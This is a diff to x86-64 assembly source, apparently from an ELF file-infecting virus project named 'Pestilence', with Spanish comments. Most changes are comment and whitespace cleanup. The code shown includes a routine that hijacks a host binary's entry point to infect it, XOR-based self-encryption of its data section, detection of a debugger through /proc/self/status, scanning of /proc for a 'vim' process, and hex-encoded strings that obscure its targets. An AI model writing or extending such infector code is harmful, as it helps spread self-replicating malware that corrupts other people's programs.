@@ -116,7 +116,6 @@ section .text
         dec rdx
         dec rdx
         nop
-        ; ejemplos
         cmp rbx, rbx
         jne __F_crazy
         mov rax, rax
@@ -128,12 +127,9 @@ section .text
         sub rax, 0
         or  rax, 0
         and rax, -1
-
         not rax
         not rax
-
         cmp rbx, rsi
-        
         ret
     __F_crazy__end:
 
@@ -153,7 +149,6 @@ section .text
         mov rbx, 0x2537683570773774
         mov rax, 0x0404040404040404 
         xor rbx, rax
-        ; lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
         xor rdx, rdx              ; índice key
 
@@ -166,8 +161,6 @@ section .text
         ror rbx, 8
 
         inc rcx
-        ;inc rdx
-        ;and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .decrypt_data_loop       
 
@@ -237,20 +230,6 @@ section .text
         cld
         rep movsb
 
-        ; calculamos longitud del nombre del directorio PID
-
-        ; ; rdi = puntero al nombre del directorio (string acabada en 0)
-        ; lea rdi, [r8 + dirent.d_name]
-        ; mov al, 0
-        ; mov rcx, -1   ; 0xffffffffffffffff
-        ; cld
-        ; repne scasb
-        ; ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
-        ; ; hasta encontrar 0, es len + 1. (magia negra asm)
-        ; not rcx
-        ; dec rcx
-
-        ; concatenamos "/proc/" + "d_name"
         CALL_ENCRYPT(strlen)
 
         lea rdi, [rsp]
@@ -530,7 +509,7 @@ section .text
 
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
-        mov VAR(Pestilence.original_entry), rbx         ; save original_entry
+        mov VAR(Pestilence.original_entry), rbx     ; save original_entry
         lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
         mov rbx, [rbx]                              ; rbx = rax + *(rbx)
         add rbx, rax
@@ -594,9 +573,8 @@ section .text
         mov rax, 0x0404040404040404 
         xor rbx, rax
 
-        ;lea rbx, [rel xor_pass]   ; key
-        xor rcx, rcx              ; contador función
-        xor rdx, rdx              ; índice key
+        xor rcx, rcx                    ; contador función
+        xor rdx, rdx                    ; índice key
 
     .encrypt_data_loop:
         mov r8b, [r10 + rcx]
@@ -606,8 +584,6 @@ section .text
 
         ror rbx, 8
         inc rcx
-        ; inc rdx
-        ; and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .encrypt_data_loop       
     
@@ -690,7 +666,6 @@ section .text
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
     forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
-    hello           db      "[+] hello",10,0 ;11
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     __F_data__end:
